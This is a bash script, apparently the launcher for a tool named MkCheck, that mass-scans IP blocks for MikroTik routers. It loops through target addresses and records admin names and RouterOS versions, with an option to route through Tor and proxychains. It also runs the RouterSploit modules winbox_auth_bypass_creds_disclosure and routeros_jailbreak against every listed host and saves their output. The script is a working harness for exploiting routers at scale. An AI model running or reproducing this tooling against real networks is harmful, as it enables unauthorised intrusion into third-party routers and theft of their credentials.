#!/bin/bash
LPATH='/opt/MkCheck/'
ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'
YLW='\033[1;33m'
LBBLUE='\e[104m'
RED='\033[0;31m'
LGRY='\033[0;37m'
INV='\e[7m'
BRED='\033[1;31m'
UPURPLE='\033[4;35m'
UBLUE='\033[4;34m'
URED='\033[4;31m'

sudo chown $USER:$USER -R /opt/MkCheck
cd /opt/MkCheck
# Root Check
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root" 
   exit 1
fi
TIK=$(cat /opt/MkCheck/files/tiks.txt)
if [[ ${TIK} == "" ]]; then
	echo -e "${URED}Please enter an IP block in ${UBLUE}files/tiks.txt ${URED}to start scanning first${NC}"
	sudo nano /opt/MkCheck/files/tiks.txt
fi
# Tiks.txt file for RouterSploit
if [[ ! -f '/opt/MkCheck/files/tiks_rsf.txt' ]]; then
	cp /opt/MkCheck/files/tiks.txt /opt/MkCheck/files/tiks_rsf.txt
fi
# Tiks.txt file for Result sorting
if [[ ! -f '/opt/MkCheck/files/tiks_res.txt' ]]; then
	cp /opt/MkCheck/files/tiks.txt /opt/MkCheck/files/tiks_res.txt
fi
# Result folder check
if [[ ! -d '/opt/MkCheck/results' ]]; then
	mkdir /opt/MkCheck/results
fi
# RSF folder check
if [[ ! -d '/opt/MkCheck/results/RSF' ]]; then
	mkdir /opt/MkCheck/results/RSF
fi
# Vuln folder check
if [[ ! -d '/opt/MkCheck/results/Vulns' ]]; then
	mkdir /opt/MkCheck/results/Vulns
fi
# Final Results Correlation for Net AP Name 
apresults(){
	for log in `cat /opt/MkCheck/files/tiks_res.txt`
		do
			echo "${log}"
			echo "${log}" >> results/Vulns/final.result
			cat results/Vulns/Mikro_${log}.results
			cat results/Vulns/Mikro_${log}.results >> results/Vulns/final.result
			echo "==========================================================================="
			echo "===========================================================================" >> results/Vulns/final.result
		done
}
# Jailbreak Result Correlation
jbresults(){
	for log in `cat /opt/MkCheck/files/tiks_res.txt`
		do
			echo "${log}"
			echo "${log}" >> results/RSF/Jailbreak_final.result
			cat results/RSF/Jailbreak_${log}.results
			cat results/RSF/Jailbreak_${log}.results >> results/RSF/Jailbreak_final.result
			echo "==========================================================================="
			echo "===========================================================================" >> results/RSF/Jailbreak_final.result
		done
}
# WinBox Result Correlation
wbresults(){
	for log in `cat /opt/MkCheck/files/tiks_res.txt`
		do
			echo "${log}"
			echo "${log}" >> results/RSF/WinBox_final.result
			cat results/Vulns/Winbox_${log}.results
			cat results/Vulns/Winbox_${log}.results >> results/RSF/WinBox_final.result
			echo "==========================================================================="
			echo "===========================================================================" >> results/RSF/WinBox_final.result
		done
}
# New Target Thread for MCheck
target(){
	RARG=$(python3 scripts/get_t.py)
	VAR=$(echo ${RARG})
	FARG='host = "ARG"'
}
# Host Auto Load
running(){
	mv files/tiks1.txt files/tiks.txt
	# Start
	TARG=$(cat scripts/miko.py | grep "host = *")
	sed -i "s/${TARG}/${FARG}/g" scripts/miko.py
	sed -i "s/ARG/${VAR}/g" scripts/miko.py
	echo -e "${UBLUE}Next Target is ${YLW}${VAR}${NC}"
}
function trap_ctrlc ()
{
    # perform cleanup here
    echo -e "${URED}Ctrl-C caught...${NC}"
    echo -e "${W}Would you like to exit?${YLW}(y/n)${NC}"
	read EXIT
	if [[ ${EXIT} == "y" ]]; then
		exit 2
	else
		return
	fi
}
# Mikro Network AP Name Check (No Proxy)
mchecker(){
	while :
	do
		echo "Press <CTRL+C> to exit."
		target
		echo ""
		running
		echo ""
		python scripts/miko.py | tee output.log
		NAME=$(cat output.log | grep 'admin@')
		VER=$(cat output.log | grep 'MikroTik RouterOS')
		echo "${NAME}" >> results/Vulns/${VAR}.results
		echo "${VER}" >> results/Vulns/${VAR}.results
		echo "==============================================================================================" 
		sudo rm output.log
		if [[ -f '/opt/MkCheck/results/Vulns/*.255.results' ]]; then
			apresults
			main
		fi
	done
}
# Routersploit Vuln Check
rtsploit(){
	cd /root/routersploit
	for name in `cat /opt/MkCheck/files/tiks_rsf.txt`
		do
			#winbox_auth_bypass_creds_disclosure
			WINSAVE=$(sudo python3 rsf.py -m exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure -s "target ${name}")
			echo "${WINSAVE}" >> /opt/MkCheck/results/RSF/Winbox_${name}.results
			echo "${WINSAVE}"
			# routeros_jailbreak
			JAIL=$(sudo python3 rsf.py -m exploits/routers/mikrotik/routeros_jailbreak -s "target ${name}")
			echo "${JAIL}"
			echo "${JAIL}" >> /opt/MkCheck/results/RSF/Jailbreak_${name}.results
			if [[ -f '/opt/MkCheck/results/RSF/*.255.results' ]]; then
				jbresults
				wbresults
				main
			fi
		done	
}
# Update Args
up_arg(){
    echo $1 >> temp.log
    echo $2 >> temp.log
    echo $3 >> temp.log
    echo $4 >> temp.log
    echo $5 >> temp.log
    echo $6 >> temp.log
    echo $7 >> temp.log
    echo $8 >> temp.log
    echo $9 >> temp.log

    for UFILES in `cat temp.log`
       	        do
    	            rm /opt/MkCheck/${UFILES}
                done
    rm /opt/MkCheck/temp.log
}
update(){
    cd /opt/MkCheck
    echo -e "${ORNG}"
    figlet -f mini "Checking for updates"
    echo -e "${NC}"
    git fetch
    VER=$(git pull)
    if [[ ${VER} == "Already up to date." ]]; then
        echo -e "${LP}"
        figlet -f mini "Up to date."
        echo -e "${NC}"
    else
		sleep 5
	    echo -e "${W}Are there pull conflicts with files?(y/n)${NC}"
        sleep 3
	    read UANS
	    if [[ ${UANS} == "y" ]]; then
            export LPATH
            echo -e "${W}Please enter the conflicting files (seperated by a space)${NC}"
		    read FILES
            sleep 2
		    up_arg ${FILES}
		    git pull
	    else
		    sleep 1
	    fi
	    if [[ -f '/usr/sbin/mkcheck' ]]; then
			sudo cp mkcheck -t /usr/sbin
			sudo chmod +x /usr/sbin/mkcheck
			sudo chown $USER:$USER /usr/sbin/mkcheck
		fi
		main
	fi
  echo -e "${NC}"
}
#MCheck Start
main(){
	echo -e "${BRED}"
	python3 files/banner.py
	echo -e "${NC}"
	PS3='What tool would you like to use?'
		options=("MikroTik Auto-EX" "Routersploit Vuln Check" "Sort Results" "Update")
		select opt in "${options[@]}"
			do
				case $opt in
					"MikroTik Auto-EX")
						BK=$(date -Iseconds)
						echo -e "${YLW}Creating a backup of this sessions Target file as ${UBLUE}tiks_${BK}.txt${NC}"
						cp files/tiks.txt files/tiks_${BK}.txt
						echo -e "${W}Would you like to run MCheck using a proxy?${YLW}(y/n)${NC}"
						read PROXY 
						if [[ ${PROXY} == "y" ]]; then
							sudo service tor start
							proxychains4 mchecker
						else
							mchecker
						fi
						;;

					"Routersploit Vuln Check")
						rtsploit
						;;

					"Sort Results")
						apresults
						jbresults
						wbresults
						;;

					"Update")
						update
						;;

				esac
			done
		echo -e "${YLW}All results have been saved to ${UPURPLE}/opt/MkCheck/files/${NC}"
}
cd /opt/MkCheck
# initialise trap to call trap_ctrlc function
# when signal 2 (SIGINT) is received
trap "trap_ctrlc" 2

echo -e "${LP}"
figlet MkCheck
echo -e "${NC}"
main
exit 0